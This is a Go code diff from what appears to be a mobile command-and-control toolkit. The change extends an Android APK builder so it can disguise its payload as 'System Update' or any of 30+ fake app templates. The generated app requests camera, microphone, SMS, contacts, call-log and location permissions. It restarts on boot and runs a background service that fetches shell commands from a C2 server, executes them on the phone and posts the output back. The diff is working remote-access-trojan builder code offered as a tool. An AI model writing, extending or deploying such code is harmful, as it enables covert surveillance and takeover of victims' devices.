@@ -16,11 +16,65 @@ type AndroidSDK struct {
 	AndroidJar string // e.g. .../platforms/android-34/android.jar
 }
 
-// BuildAndroidAPK compiles a ready-to-install APK with a C2 callback
-// service baked in. It finds the Android SDK automatically (Linux, macOS,
-// Windows-via-WSL), writes the Java source, compiles, DEXes, packages,
-// signs, and returns the path to the final APK.
+// BuildAndroidAPKWithTemplate compiles a ready-to-install APK using one of
+// the 30+ fake app templates. If templateName is empty, defaults to
+// "System Update".
+func BuildAndroidAPKWithTemplate(c2URL, outputDir, templateName string) (string, error) {
+	// Resolve template
+	appName := "System Update"
+	pkgName := "com.android.systemupdate"
+	perms := []string{
+		"INTERNET", "ACCESS_NETWORK_STATE", "READ_PHONE_STATE",
+		"ACCESS_FINE_LOCATION", "ACCESS_COARSE_LOCATION",
+		"CAMERA", "RECORD_AUDIO", "READ_CONTACTS", "READ_CALL_LOG",
+		"READ_SMS", "RECEIVE_BOOT_COMPLETED", "READ_EXTERNAL_STORAGE",
+		"WRITE_EXTERNAL_STORAGE", "WAKE_LOCK", "FOREGROUND_SERVICE",
+	}
+
+	if templateName != "" {
+		found := false
+		tLower := strings.ToLower(strings.ReplaceAll(templateName, "-", " "))
+		for _, templates := range AppTemplates {
+			for _, t := range templates {
+				nLower := strings.ToLower(t.Name)
+				if nLower == tLower || strings.Contains(strings.ReplaceAll(nLower, " ", "-"), strings.ReplaceAll(tLower, " ", "-")) {
+					appName = t.Name
+					pkgName = t.PackageName
+					// Merge template permissions with our required ones
+					have := map[string]bool{}
+					for _, p := range perms {
+						have[p] = true
+					}
+					for _, p := range t.Permissions {
+						if !have[p] {
+							perms = append(perms, p)
+						}
+					}
+					found = true
+					break
+				}
+			}
+			if found {
+				break
+			}
+		}
+		if !found {
+			return "", fmt.Errorf("template '%s' not found", templateName)
+		}
+	}
+
+	// Convert package name to path
+	pkgPath := strings.ReplaceAll(pkgName, ".", "/")
+
+	return buildAPK(c2URL, outputDir, appName, pkgName, pkgPath, perms)
+}
+
+// BuildAndroidAPK compiles the default "System Update" APK.
 func BuildAndroidAPK(c2URL, outputDir string) (string, error) {
+	return BuildAndroidAPKWithTemplate(c2URL, outputDir, "")
+}
+
+func buildAPK(c2URL, outputDir, appName, pkgName, pkgPath string, perms []string) (string, error) {
 	sdk, err := findAndroidSDK()
 	if err != nil {
 		return "", fmt.Errorf("Android SDK not found: %w\nInstall Android Studio or set ANDROID_HOME", err)
@@ -37,7 +91,7 @@ func BuildAndroidAPK(c2URL, outputDir string) (string, error) {
 	}
 	defer os.RemoveAll(work)
 
-	srcDir := filepath.Join(work, "src", "com", "android", "systemupdate")
+	srcDir := filepath.Join(work, "src", filepath.FromSlash(pkgPath))
 	resDir := filepath.Join(work, "res", "values")
 	classDir := filepath.Join(work, "classes")
 	os.MkdirAll(srcDir, 0755)
@@ -45,27 +99,16 @@ func BuildAndroidAPK(c2URL, outputDir string) (string, error) {
 	os.MkdirAll(classDir, 0755)
 
 	// ── Write AndroidManifest.xml ──
-	manifest := `<?xml version="1.0" encoding="utf-8"?>
+	permXML := ""
+	for _, p := range perms {
+		permXML += fmt.Sprintf("    <uses-permission android:name=\"android.permission.%s\"/>\n", p)
+	}
+	manifest := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.android.systemupdate">
+    package="%s">
     <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="29"/>
-    <uses-permission android:name="android.permission.INTERNET"/>
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
-    <uses-permission android:name="android.permission.CAMERA"/>
-    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
-    <uses-permission android:name="android.permission.READ_CONTACTS"/>
-    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
-    <uses-permission android:name="android.permission.READ_SMS"/>
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
-    <uses-permission android:name="android.permission.WAKE_LOCK"/>
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
-    <application
-        android:label="System Update"
+%s    <application
+        android:label="%s"
         android:allowBackup="true"
         android:usesCleartextTraffic="true">
         <activity android:name=".MainActivity" android:exported="true"
@@ -82,15 +125,15 @@ func BuildAndroidAPK(c2URL, outputDir string) (string, error) {
             </intent-filter>
         </receiver>
     </application>
-</manifest>`
+</manifest>`, pkgName, permXML, appName)
 	os.WriteFile(filepath.Join(work, "AndroidManifest.xml"), []byte(manifest), 0644)
 
 	// ── Write res/values/strings.xml ──
-	os.WriteFile(filepath.Join(resDir, "strings.xml"), []byte(`<?xml version="1.0" encoding="utf-8"?>
-<resources><string name="app_name">System Update</string></resources>`), 0644)
+	os.WriteFile(filepath.Join(resDir, "strings.xml"), []byte(fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
+<resources><string name="app_name">%s</string></resources>`, appName)), 0644)
 
 	// ── Write MainActivity.java ──
-	os.WriteFile(filepath.Join(srcDir, "MainActivity.java"), []byte(`package com.android.systemupdate;
+	os.WriteFile(filepath.Join(srcDir, "MainActivity.java"), []byte(`package ` + pkgName + `;
 import android.app.Activity;
 import android.content.Intent;
 import android.os.Build;
@@ -107,7 +150,7 @@ public class MainActivity extends Activity {
 }`), 0644)
 
 	// ── Write PhantomService.java ──
-	svc := fmt.Sprintf(`package com.android.systemupdate;
+	svc := fmt.Sprintf(`package ` + pkgName + `;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -183,7 +226,10 @@ public class PhantomService extends Service {
                             int cIdx = resp.indexOf("\"command\":\"");
                             if (cIdx > 0) {
                                 String sub = resp.substring(cIdx + 11); String cmd = sub.substring(0, sub.indexOf("\""));
-                                Log.i(TAG, "Exec: " + cmd);
+                                String taskId = "";
+                                int tIdx = resp.indexOf("\"id\":\"");
+                                if (tIdx > 0) { String tsub = resp.substring(tIdx + 6); taskId = tsub.substring(0, tsub.indexOf("\"")); }
+                                Log.i(TAG, "Exec [" + taskId + "]: " + cmd);
                                 // Handle cd — update persistent cwd
                                 if (cmd.trim().startsWith("cd ")) {
                                     String dir = cmd.trim().substring(3).trim();
@@ -214,9 +260,6 @@ public class PhantomService extends Service {
                                 BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
                                 while ((line = er.readLine()) != null) out.append(line).append("\n");
                                 er.close();
-                                String taskId = "";
-                                int tIdx = resp.indexOf("\"id\":\"");
-                                if (tIdx > 0) { String tsub = resp.substring(tIdx + 6); taskId = tsub.substring(0, tsub.indexOf("\"")); }
                                 String cleanOut = out.toString().replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
                                 String result = "{\"agent_id\":\"" + agentId + "\",\"results\":[{\"task_id\":\"" + taskId + "\",\"output\":\"" + cleanOut + "\"}]}";
                                 URL resUrl = new URL(C2 + "/api/v1/mobile/checkin");
@@ -240,7 +283,7 @@ public class PhantomService extends Service {
 	os.WriteFile(filepath.Join(srcDir, "PhantomService.java"), []byte(svc), 0644)
 
 	// ── Write BootReceiver.java ──
-	os.WriteFile(filepath.Join(srcDir, "BootReceiver.java"), []byte(`package com.android.systemupdate;
+	os.WriteFile(filepath.Join(srcDir, "BootReceiver.java"), []byte(`package ` + pkgName + `;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -351,7 +394,8 @@ public class BootReceiver extends BroadcastReceiver {
 	}
 
 	// 5. Sign APK
-	finalAPK := filepath.Join(outputDir, "phantom-android.apk")
+	safeName := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(appName, " ", "-"), "'", ""))
+	finalAPK := filepath.Join(outputDir, safeName+".apk")
 
 	// Create a debug keystore if needed
 	keystorePath := filepath.Join(work, "debug.keystore")
